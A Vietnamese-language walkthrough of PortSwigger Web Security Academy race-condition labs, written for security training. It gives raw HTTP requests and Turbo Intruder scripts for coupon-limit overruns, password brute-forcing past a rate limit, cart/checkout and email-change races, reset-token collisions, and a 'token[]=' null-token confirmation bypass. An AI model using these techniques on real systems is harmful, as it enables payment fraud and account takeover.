# Race condition

# **Lab: Limit overrun race conditions**

[Lab: Limit overrun race conditions | Web Security Academy](https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun)

- Thực hiện thêm sản phẩm `Lightweight "l33t" Leather Jacket` vào giỏ hàng.
    
    ![image.png](Race%20condition/image.png)
    
- Điều hướng đến chức năng `Giỏ hàng > Apply coupon` . Áp mã giảm giá. Tuy nhiên thì ở đây, mã giảm giá không được dùng lại nhiều lần
    
    ![image.png](Race%20condition/image%201.png)
    
- Tuy nhiên, nếu thực hiện gửi song song nhiều request áp mã giảm giá 1 lần thì liệu server có kịp kiểm tra mã giảm giá đó đã dùng hay chưa? Thực hiện gửi song song nhiều request tới API `POST /cart/coupon`
    - Request
        
        ```jsx
        POST /cart/coupon HTTP/2
        Host: 0af6001203e4938980e930d7002e00f0.web-security-academy.net
        Cookie: session=wE042yyQRtgA8cJhjvnQ6jYhV0QRrQlZ
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 52
        Origin: https://0af6001203e4938980e930d7002e00f0.web-security-academy.net
        Referer: https://0af6001203e4938980e930d7002e00f0.web-security-academy.net/cart
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=eQdygsPLhKpDFyVaatbWADwKFkWChzjp&coupon=PROMO20
        ```
        
    - POC
        
        ![image.png](Race%20condition/image%202.png)
        
    - Kết quả có 1 số request áp mã thành công
        
        ![image.png](Race%20condition/image%203.png)
        
        ![image.png](Race%20condition/image%204.png)
        
- Quay lại chức năng giỏ hàng, quan sát thấy số tiền đã được giảm đi rất nhiều
    - POC
        
        ![image.png](Race%20condition/image%205.png)
        
- Thực hiện thanh toán, hoàn thành giải lab
    
    ![image.png](Race%20condition/image%206.png)
    

# **Lab: Bypassing rate limits via race conditions**

[Lab: Bypassing rate limits via race conditions | Web Security Academy](https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits)

- Thực hiện điều hướng đến chức năng `Login`
    
    ![image.png](Race%20condition/image%207.png)
    
- Thực hiện login với password sai, sau một số lần, nhận thấy phải đợi 120s sau mới login được tiếp
    
    ![image.png](Race%20condition/image%208.png)
    

- Thực hiện gửi toàn bộ request vào trong một packer rồi gửi đi → có thể phía backend sẽ không kiểm tra được
- Thực hiện sử dụng Turbo Intruder như sau:
    - Config
        
        ![image.png](Race%20condition/image%209.png)
        
    - Code
        
        ```jsx
        def queueRequests(target, wordlists):
        
            # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
            # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
            # for more information, check out https://portswigger.net/research/smashing-the-state-machine
            engine = RequestEngine(endpoint=target.endpoint,
                                   concurrentConnections=1,
                                   engine=Engine.BURP2
                                   )
        
            # the 'gate' argument withholds part of each request until openGate is invoked
            # if you see a negative timestamp, the server responded before the request was complete
            for word in wordlists.clipboard:
                engine.queue(target.req, word, gate='race1')
        
            # once every 'race1' tagged request has been queued
            # invoke engine.openGate() to send them in sync
            engine.openGate('race1')
        
        def handleResponse(req, interesting):
            table.add(req)
        
        ```
        
- Thực hiện copy list password và thực hiện attack
- Quan sát thấy password đúng là `superman`
    
    ![image.png](Race%20condition/image%2010.png)
    
- Login thành công. Điều hướng đến chức năng `Admin panel`
    
    ![image.png](Race%20condition/image%2011.png)
    

- Xóa user `carlos` thành công. Hoàn thành giải lab
    
    ![image.png](Race%20condition/image%2012.png)
    

# **Lab: Multi-endpoint race conditions**

[Lab: Multi-endpoint race conditions | Web Security Academy](https://portswigger.net/web-security/race-conditions/lab-race-conditions-multi-endpoint)

- Bài này em xem solution ở chỗ ý tưởng 2 endpoint nào có thể có lỗi ạ
- Thực hiện login vào tài khoản `wiener:peter`
- Thêm sản phẩm sau vào giỏ hàng
    
    ![image.png](Race%20condition/image%2013.png)
    

- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /cart` và lưu lại request này
    - Request
        
        ```jsx
        POST /cart HTTP/2
        Host: 0aba00bb0427e6918188de8800ec0061.web-security-academy.net
        Cookie: session=KXpwHJgrsypzJWneJ9HkhyA1RDCfwOjS
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 36
        Origin: https://0aba00bb0427e6918188de8800ec0061.web-security-academy.net
        Referer: https://0aba00bb0427e6918188de8800ec0061.web-security-academy.net/product?productId=2
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        productId=1&redir=PRODUCT&quantity=1
        ```
        
- Thực hiện tiến đến giỏ hàng và thanh toán.
    - POC
        
        ![image.png](Race%20condition/image%2014.png)
        
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /cart/checkout` và chuyển sang tab `Repeater` .
    - Request
        
        ```jsx
        POST /cart/checkout HTTP/2
        Host: 0aba00bb0427e6918188de8800ec0061.web-security-academy.net
        Cookie: session=KXpwHJgrsypzJWneJ9HkhyA1RDCfwOjS
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 37
        Origin: https://0aba00bb0427e6918188de8800ec0061.web-security-academy.net
        Referer: https://0aba00bb0427e6918188de8800ec0061.web-security-academy.net/cart
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=QyK3cB0Rp21r2HSXc0PrPiyQMN0CwglA
        ```
        
- Thực hiện gửi song song 9 request gửi tới API `POST /cart` và 1 request tới API `POST /cart/checkout` đã lưu ở các bước trước bằng tính năng `Send parallel`
    - Config group
        
        ![image.png](Race%20condition/image%2015.png)
        
- Thực hiện gửi request. Quan sát thấy mua hàng thành công. Hoàn thành giải lab
    
    ![image.png](Race%20condition/image%2016.png)
    
    ![image.png](Race%20condition/image%2017.png)
    

- Giải thích: có khoảng thời gian giữa các bước kiểm tra tổng sản phẩm và cập nhật trạng thái thanh toán. Code có lỗi có thể như sau:
    
    ```jsx
    # --- Bước 1: Kiểm tra (Check) ---
    items_at_check = db.get_cart_items(user_id) # Lấy danh sách lúc này (vd: chỉ có 1 Gift Card)
    total_at_check = sum(item.price for item in items_at_check) # Tổng = $10
    balance = db.get_user_balance(user_id) # Ví = $100
    
    if balance >= total_at_check:
        # <--- CỬA SỔ RACE (RACE WINDOW) --->
        # Lúc này, một request khác thực hiện db.add_item_to_cart(jacket) thành công.
        
        # --- Bước 2: Thực hiện (Act) ---
        # Thay vì dùng 'total_at_check', server lại truy vấn lại giỏ hàng 
        # để lấy danh sách "thực tế" hiện tại trước khi chốt đơn.
        
        actual_items = db.get_cart_items(user_id) # Bây giờ đã có: Gift Card + Jacket
        actual_total = sum(item.price for item in actual_items) # Tổng mới = $1347
        
        db.deduct_balance(user_id, actual_total) # Trừ $1347 từ $100 => -$1247
        db.confirm_order(user_id, actual_items)
    ```
    
- Về bước check thời gian trong lý thuyết, có thể dùng send sequence request (one connection). Nếu như chỉ gói đầu vượt thời gian → có thể test race bình thường vì nếu gửi cùng 1 packet thì tất cả cùng đến chậm do cùng độ trễ hạ tầng mạng không phải do be xử lý

# **Lab: Single-endpoint race conditions**

[Lab: Single-endpoint race conditions | Web Security Academy](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint)

- Thực hiện login tài khoản `wiener:peter` . Điều hướng đến chức năng `My account > Update email`
    
    ![image.png](Race%20condition/image%2018.png)
    
- Tại đây, quan sát thấy khi update email thì sẽ có link gửi về email mới.
    
    ![image.png](Race%20condition/image%2019.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /my-account/change-email` và chuyển sang tab `Repeater` . Tại đây, thực hiện đổi email muốn update thành `carlos@[ginandjuice.shop](http://40ginandjuice.shop/)`  và [`wiener@exploit-0a5000a803afbca3807834c6017a0053.exploit-server.net`](mailto:wiener@exploit-0a5000a803afbca3807834c6017a0053.exploit-server.net) . Thực hiện gửi song song các request này
    - Request
        
        ```jsx
        POST /my-account/change-email HTTP/2
        Host: 0ade008503a8bcbb8039353900ce0054.web-security-academy.net
        Cookie: session=PiG4GQiksKZh09fdqGXByqQleTB484Ge
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 112
        Origin: https://0ade008503a8bcbb8039353900ce0054.web-security-academy.net
        Referer: https://0ade008503a8bcbb8039353900ce0054.web-security-academy.net/my-account?id=wiener
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        email=<email>&csrf=aJELJu7ICXRXHTLiU8aKWWKJtXrDt0JS
        ```
        
    - Config
        
        ![image.png](Race%20condition/image%2020.png)
        
- Vào trong mail của chúng ta, nhận thấy có mail gửi về. Thực hiện click vào và nhận thấy email đã update thành `carlos@[ginandjuice.shop](http://40ginandjuice.shop/)`
    
    ![image.png](Race%20condition/image%2021.png)
    
    ![image.png](Race%20condition/image%2022.png)
    
- Thực hiện xóa user `carlos` và hoàn thành giải lab
    
    ![image.png](Race%20condition/image%2023.png)
    
- Code phía backend có thể như sau, race window sẽ có ở khi truy vấn email sẽ gửi
    
    ```jsx
    # Route xử lý yêu cầu đổi email
    @app.route('/change-email', methods=['POST'])
    def handle_change_email():
        new_email = request.form['email']
        user_id = session['user_id']
    
        # BƯỚC 1: Cập nhật địa chỉ email đang chờ vào Database
        # Mỗi lần gọi, lệnh này sẽ GHI ĐÈ lên giá trị cũ trong cột pending_email
        db.execute("UPDATE users SET pending_email = ? WHERE id = ?", (new_email, user_id))
    
        # BƯỚC 2: Kích hoạt tiến trình gửi email xác nhận
        # Race condition xảy ra ở đây nếu hàm này đọc lại database để lấy email
        send_confirmation_process(user_id)
    
        return "Email xác nhận đã được gửi!"
    
    # Hàm thực hiện gửi email (thường chạy bất đồng bộ hoặc có độ trễ)
    def send_confirmation_process(user_id):
        # ĐIỂM YẾU: Server truy vấn lại DB để lấy địa chỉ 'pending_email'
        user_info = db.query("SELECT pending_email FROM users WHERE id = ?", (user_id))
        email_to_send = user_info['pending_email']
    
        # Gửi email thực tế với token xác nhận
        email_service.send(to=email_to_send, body="Nhấn vào link này để xác nhận...")
    ```
    

# **Lab: Exploiting time-sensitive vulnerabilities**

[Lab: Exploiting time-sensitive vulnerabilities | Web Security Academy](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities)

- Bài này em có xem solution ở chỗ php xử lý session
- Thực hiện điều hướng đến chức năng `Forgot password` .
    
    ![image.png](Race%20condition/image%2024.png)
    
- Tại đây, thực hiện gửi username để reset password
    
    ![image.png](Race%20condition/image%2025.png)
    
- Thực hiện gửi request 2 lần nhận thấy token gen ra là khác nhau → server dùng chuỗi random hoặc dùng timestamp hoặc counter… là những thứ gì khác biệt.
    - POC
        
        ![image.png](Race%20condition/image%2026.png)
        
- Ở đây, mặc dù chúng ta có thể thử case phía server dùng timestamp để gen token. Tuy nhiên như POC ở trên dù cùng thời gian nhưng token vẫn khác nhau. Nhưng còn 1 khả năng nữa đó là dựa vào cookie có `phpsessionid` thì chúng ta đoán được backend dùng PHP. Và máy chủ này chỉ xử lý 1 request tối đa cho 1 phiên. Vậy thì nhiều phiên cùng lúc thì sẽ vẫn được xử lý cùng lúc.
- Thực hiện kiểm chứng giả định trên, chúng ta thấy rằng thực sự nếu khác phiên thì 2 request đến cùng lúc vẫn được cùng xử lý. Thực hiện gửi 2 request cùng username `wiener` nhưng khác phiên để kiểm chứng điều này
    - POC
        - Request
            
            ```jsx
            POST /forgot-password HTTP/2
            Host: 0a73001a0321fdf5804512f300d30040.web-security-academy.net
            Cookie: phpsessionid=AdQiJA7Wa8vsxRtp3U3tHCspc0eaPb0D
            User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
            Accept-Language: en-US,en;q=0.9
            Accept-Encoding: gzip, deflate, br
            Content-Type: application/x-www-form-urlencoded
            Content-Length: 53
            Origin: https://0a73001a0321fdf5804512f300d30040.web-security-academy.net
            Referer: https://0a73001a0321fdf5804512f300d30040.web-security-academy.net/forgot-password
            Upgrade-Insecure-Requests: 1
            Sec-Fetch-Dest: document
            Sec-Fetch-Mode: navigate
            Sec-Fetch-Site: same-origin
            Sec-Fetch-User: ?1
            Priority: u=0, i
            Te: trailers
            
            csrf=rRqUWLmtnT3lu15BBlXok71HMrOdVGyO&username=wiener
            ```
            
        - Response
            
            ![image.png](Race%20condition/image%2027.png)
            
- Vậy thì chúng ta có thể thử với username khác cho 1 request thì cả 2 token cho 2 username đều giống nhau. Lưu ý, ở đây chúng ta sẽ chỉ gửi 2 request thôi vì nếu nhiều hơn thì khả năng là các request của cùng 1 người dùng sẽ được xử lý trước khiến cho request còn lại sẽ chệch 1 chút và cũng không có ích gì vì nếu cùng phiên thì request cũng không được xử lý.
    - Request 1
        
        ```jsx
        POST /forgot-password HTTP/2
        Host: 0a73001a0321fdf5804512f300d30040.web-security-academy.net
        Cookie: phpsessionid=<sessionId1>
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 53
        Origin: https://0a73001a0321fdf5804512f300d30040.web-security-academy.net
        Referer: https://0a73001a0321fdf5804512f300d30040.web-security-academy.net/forgot-password
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=<token1>&username=wiener
        ```
        
    - Request 2
        
        ```jsx
        POST /forgot-password HTTP/2
        Host: 0a73001a0321fdf5804512f300d30040.web-security-academy.net
        Cookie: phpsessionid=<sessionId2>
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 53
        Origin: https://0a73001a0321fdf5804512f300d30040.web-security-academy.net
        Referer: https://0a73001a0321fdf5804512f300d30040.web-security-academy.net/forgot-password
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=<token2>&username=carlos
        ```
        
    - Thực hiện gửi song song như sau:
        
        ![image.png](Race%20condition/image%2028.png)
        
- Thực hiện lấy token gửi trong mail cho `wiener`. Thực hiện reset với token này. Trong phần mềm Burpsuite, thực hiện thay đổi param `username` gửi tới API `POST /forgot-password?user=<username>&token=<token>` thành `carlos` . Quan sát thấy reset password thành công
    - Request
        
        ```jsx
        POST /forgot-password?user=carlos&token=c28859d49106c47ef048c72f8defa443222bacc3 HTTP/2
        Host: 0a73001a0321fdf5804512f300d30040.web-security-academy.net
        Cookie: phpsessionid=Feve6z01s7cJ0vfPYPhQgMv0bLNrakrs
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 130
        Origin: https://0a73001a0321fdf5804512f300d30040.web-security-academy.net
        Referer: https://0a73001a0321fdf5804512f300d30040.web-security-academy.net/forgot-password?user=carlos&token=c28859d49106c47ef048c72f8defa443222bacc3
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=dRsVpA9GOcEfBzTEo8jvAT3qodm2cMoJ&token=c28859d49106c47ef048c72f8defa443222bacc3&user=carlos&new-password-1=1&new-password-2=1
        ```
        
    - Response
        
        ![image.png](Race%20condition/image%2029.png)
        
- Login vào tài khoản `carlos` , điều hướng đến chức năng `Admin panel` và thành công xóa user. Hoàn thành giải lab
    
    ![image.png](Race%20condition/image%2030.png)
    
    ![image.png](Race%20condition/image%2031.png)
    

# **Lab: Partial construction race conditions**

[Lab: Partial construction race conditions | Web Security Academy](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction)

- Thực hiện điều hướng đến chức năng `Register`
    
    ![image.png](Race%20condition/image%2032.png)
    
- Tại đây, thực hiện đăng ký với email có domain như mô tả
    
    ![image.png](Race%20condition/image%2033.png)
    
- Sau đó, thực hiện đọc file js `/resources/static/users.js` thấy có xuất hiện path ẩn để confirm tài khoản với token được gửi về mail
    - POC
        
        ![image.png](Race%20condition/image%2034.png)
        
- Ở đây, nếu như thực hiện đăng ký mail khác mail trong mô tả thì sẽ bị báo lỗi, vì vậy chúng ta không thể lấy được token từ mail. Tuy nhiên, vì có thể trong quá trình ghi object mới vào db, thời gian gen ra token lâu hơn sẽ ghi sau → có khoảng cách giữa 2 bước → token khoảng giữa thời gian này sẽ null → attack kiểm soát được token null bằng một số phương pháp.
- Để thực hiện ý tưởng trên, chúng ta có thể truyền token dạng `token[]=` , phía server có thể xử lý như một giá trị null khi đưa vào hash và so sánh với dữ liệu lấy từ db
- Thực hiện bắt request gửi tới API `POST /register` và tạo request gửi tới API `POST /confirm` . Hai request sẽ như sau:
    - API `POST /register`
        
        ```jsx
        POST /register HTTP/2
        Host: 0aaa005c041d082083fcf075009700f1.web-security-academy.net
        Cookie: phpsessionid=DDDALC9UwlBKnbzppJaeZFU5A4EZdEDW
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 91
        Origin: https://0aaa005c041d082083fcf075009700f1.web-security-academy.net
        Referer: https://0aaa005c041d082083fcf075009700f1.web-security-academy.net/register
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        csrf=sg4UBDyqdFPuhePPvPA2sgTkUqGkGfrq&username=11&email=aaa21%40ginandjuice.shop&password=1
        ```
        
    - API `POST /confirm`
        
        ```jsx
        POST /confirm?token[]= HTTP/2
        Host: 0aaa005c041d082083fcf075009700f1.web-security-academy.net
        Cookie: phpsessionid=DDDALC9UwlBKnbzppJaeZFU5A4EZdEDW
        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 0
        Origin: https://0aaa005c041d082083fcf075009700f1.web-security-academy.net
        Referer: https://0aaa005c041d082083fcf075009700f1.web-security-academy.net/register
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: same-origin
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        
        ```
        
- Mở extension Turbo Intruder và chèn 2 request trên như sau:
    - Turbo intruder config
        
        ![image.png](Race%20condition/image%2035.png)
        
    - Phần code như sau
        
        ```jsx
        def queueRequests(target, wordlists):
        
            # if the target supports HTTP/2, specify engine=Engine.BURP2 to trigger the single-packet attack
            # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
            # for more information, check out https://portswigger.net/research/smashing-the-state-machine
            engine = RequestEngine(endpoint='https://0aaa005c041d082083fcf075009700f1.web-security-academy.net:443',
                                   concurrentConnections=1,
                                   engine=Engine.BURP2
                                   )
        
            req1 = r'''<REQ1>'''
        
            req2 = r'''<REQ2>'''
        
            for i in range(20):
                gate_name = "race_" + str(i)
                username = "dat" + str(i)
                
                # Gửi 1 request đăng ký với username và email mới
                # Turbo Intruder sẽ thay các %s theo thứ tự trong list [username, username]
                engine.queue(req1, [username, username], gate=gate_name)
                
                # Gửi kèm 50 request xác nhận vào cùng một gate
                for j in range(50):
                    engine.queue(req2, gate=gate_name)
                engine.openGate(gate_name)
        
        def handleResponse(req, interesting):
            table.add(req)
        
        ```
        
    - Cần chú ý chèn thêm placeholder vào param `username` và `email`
        
        ![image.png](Race%20condition/image%2036.png)
        
- Thực hiện chạy attack, nhận thấy account `dat4` đã thành công
    
    ![image.png](Race%20condition/image%2037.png)
    
- Thực hiện login thành công. Điều hướng đến chức năng `Admin panel`
    
    ![image.png](Race%20condition/image%2038.png)
    
- Thực hiện xóa user `carlos` thành công. Hoàn thành giải lab
    
    ![image.png](Race%20condition/image%2039.png)